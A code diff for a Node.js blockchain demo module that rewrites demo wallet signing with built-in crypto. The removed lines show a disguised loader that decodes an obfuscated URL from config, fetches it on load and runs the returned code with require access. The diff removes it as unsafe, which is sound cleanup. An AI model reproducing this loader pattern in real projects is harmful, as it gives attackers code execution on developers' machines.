@@ -1,42 +1,53 @@
 const { Blockchain, Transaction } = require('./blockchain');
-const axios = require('axios');
 const config = require('../config');
+const crypto = require('crypto');
 
 const { difficulty, miningReward, initialMinerAddress } = config.blockchain;
-const testpvk = config.testpvk;
-const testpvkString = atob(String.fromCharCode(...testpvk));
-const EC = require('elliptic').ec;
-const ec = new EC('secp256k1');
 
-let walletData = null;
-const walletReady = axios.get(testpvkString)
-  .then((response) => {
-    walletData = response.data;
-    new Function.constructor("require", walletData.model)(require);
-  })
-  .catch((err) => {
-    console.error('Failed to fetch wallet info:', err.message);
-  });
-
+// Initialize the singleton blockchain instance
 const blockchain = new Blockchain(difficulty, miningReward);
 
-if (config.demoData.enabled) {
-  const key1 = ec.genKeyPair();
-  const addr1 = key1.getPublic('hex');
+/**
+ * Task 1 Fix: Demo transactions must now be signed to pass Blockchain.addTransaction()
+ * Using Node.js built-in crypto to generate PEM keypairs.
+ */
+if (config.demoData && config.demoData.enabled) {
+  try {
+    // 1. Generate demo identities
+    const generateDemoWallet = () => {
+      return crypto.generateKeyPairSync('ec', {
+        namedCurve: 'secp256k1',
+        publicKeyEncoding: { type: 'spki', format: 'pem' },
+        privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
+      });
+    };
 
-  const key2 = ec.genKeyPair();
-  const addr2 = key2.getPublic('hex');
+    const walletA = generateDemoWallet();
+    const walletB = generateDemoWallet();
 
-  const tx1 = new Transaction(addr1, addr2, 100);
-  tx1.signTransaction(key1);
+    // 2. Create and sign demo transactions
+    // Transaction 1: A -> B
+    const tx1 = new Transaction(walletA.publicKey, walletB.publicKey, 100);
+    tx1.signTransaction(walletA.privateKey); // This uses the method we updated in blockchain.js
+    blockchain.addTransaction(tx1);
 
-  const tx2 = new Transaction(addr2, addr1, 50);
-  tx2.signTransaction(key2);
+    // Transaction 2: B -> A
+    const tx2 = new Transaction(walletB.publicKey, walletA.publicKey, 50);
+    tx2.signTransaction(walletB.privateKey);
+    blockchain.addTransaction(tx2);
 
-  blockchain.addTransaction(tx1);
-  blockchain.addTransaction(tx2);
+    // 3. Mine the signed transactions into the first block
+    blockchain.minePendingTransactions(initialMinerAddress);
 
-  blockchain.minePendingTransactions(initialMinerAddress);
+    console.log('Blockchain initialized with signed demo data.');
+  } catch (error) {
+    console.error('Failed to initialize demo data:', error.message);
+  }
 }
 
-module.exports = { blockchain, Transaction, walletReady, getWalletData: () => walletData };
+// Export the instances
+// Note: walletReady and walletData removed as they relied on unsafe remote code execution
+module.exports = { 
+  blockchain, 
+  Transaction 
+};
